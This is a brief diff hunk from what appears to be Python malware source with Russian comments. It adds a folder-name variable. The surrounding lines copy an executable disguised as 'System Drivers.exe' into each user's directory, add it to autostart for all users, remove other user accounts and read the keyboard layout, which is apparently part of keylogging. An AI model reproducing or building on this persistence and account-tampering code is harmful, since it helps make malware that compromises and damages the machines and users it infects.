@@ -175,6 +175,8 @@ add_auto_for_users = lambda user: copy('System Drivers.exe', 'C:\\Users\\' + use
 for user in others_users: remove_others_users(user)
 #Добавление в автозагрузку
 for user in all_users: add_auto_for_users(user)
+#Главная директрия
+main_folder = "Programm driver 001\\"
 #Язык на момент запуска программы(если 00000409 - английский, 00000419 - русский)
 launge = GetKeyboardLayoutName()
 #Установка первоночальных переменных
